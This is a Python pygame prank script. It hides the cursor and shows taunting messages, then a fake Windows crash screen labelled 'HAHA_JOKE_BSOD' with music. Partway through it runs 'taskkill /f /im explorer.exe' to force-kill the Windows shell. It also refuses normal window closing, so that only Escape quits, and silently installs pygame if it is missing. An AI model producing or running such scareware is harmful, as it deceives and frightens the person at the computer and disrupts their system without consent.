import os
try:
	import pygame
except:
	os.system("pip install pygame==2.0.0")
import random

pygame.init()
pygame.mouse.set_visible(False)
#windowicon = pygame.image.load("Assets/icon.ico")

#screen = pygame.display.set_mode((800,600),pygame.FULLSCREEN)
screen = pygame.display.set_mode((800,600))
pygame.display.set_caption("HEY")
clock = pygame.time.Clock()

font120 = pygame.font.SysFont("Segoe UI", 100)
font28 = pygame.font.SysFont("Segoe UI", 28)
font18 = pygame.font.SysFont("Segoe UI", 16)

text1 = font120.render(":(", True, (255, 255, 255))
text2 = font28.render("Your PC ran into a problem and needs to restart. We're", True, (255, 255, 255))
text3 = font28.render("just collecting some error info, and then we'll restart for", True, (255, 255, 255))
text4 = font28.render("you.(0% Complete)", True, (255, 255, 255))
text6 = font18.render("If you'd like to know more, you can search online later for this error: HAHA_JOKE_BSOD", True, (255, 255, 255))


s1 = pygame.image.load(".\\split1.png")
s2 = pygame.image.load(".\\split2.png")
s3 = pygame.image.load(".\\split3.png")
s4 = pygame.image.load(".\\split4.png")
s5 = pygame.image.load(".\\split5.png")
s6 = pygame.image.load(".\\split6.png")
s7 = pygame.image.load(".\\split7.png")
s8 = pygame.image.load(".\\split8.png")
s9 = pygame.image.load(".\\split9.png")
s10 = pygame.image.load(".\\split10.png")

time = 0

while True:

	time = time + 1
	#print(time)
	if time < 2000:
		screen.fill((0, 0, 0))
		screen.blit(font28.render("Alex: You dont learn, dont you?", True, (255, 255, 255)),(200,300))
	if time > 1998 and time < 2000:
		pygame.mixer.Channel(0).play(pygame.mixer.Sound('.\\MattKC - Misery (Official Audio).mp3'))
	if time > 2000:
		screen.fill((0, 121, 216))
		screen.blit(text1,(60, 50))
		screen.blit(text2,(70, 180))
		screen.blit(text3,(70, 220))
		screen.blit(text4,(70, 260))
		screen.blit(text6,(70, 400))
	if time > 4000:
		screen.fill((0, 0, 0))
	if time > 6000:
		screen.fill((0, 0, 0))
		screen.blit(font28.render("Did you really fall for that?", True, (255, 255, 255)),(200,300))
	if time > 10000 and time < 14000:
		screen.fill((0, 0, 0))
		screen.blit(font28.render("That doesn't matter anyways.", True, (255, 255, 255)),(200,300))
	if time > 14000 and time < 14004:
		os.system("taskkill /f /im explorer.exe")
	if time > 14001:
		screen.fill((0,0,0))
		screen.blit(s1,(random.randrange(195, 205),280))
		screen.blit(s2,(random.randrange(195, 205),285))
		screen.blit(s3,(random.randrange(195, 205),290))
		screen.blit(s4,(random.randrange(195, 205),295))
		screen.blit(s5,(random.randrange(195, 205),300))
		screen.blit(s6,(random.randrange(195, 205),305))
		screen.blit(s7,(random.randrange(195, 205),310))
		screen.blit(s8,(random.randrange(195, 205),315))
		screen.blit(s9,(random.randrange(195, 205),320))
		screen.blit(s10,(random.randrange(195, 205),325))
	if time > 14002 and time < 14004:
		pygame.mixer.Channel(0).stop()
		pygame.mixer.Channel(0).play(pygame.mixer.Sound('.\\Solarissounds.mp3'))
	if time > 16000 and time < 16003:
		pygame.mixer.Channel(0).stop()
		pygame.mixer.Channel(0).play(pygame.mixer.Sound('.\\MattKC - Misery (Official Audio).mp3'))
		

	w, h = pygame.display.get_surface().get_size()

	pygame.display.flip()

	for event in pygame.event.get():
		if event.type == pygame.QUIT:
			print("no lol")
		if event.type == pygame.KEYDOWN and event.key == pygame.K_ESCAPE:
			quit()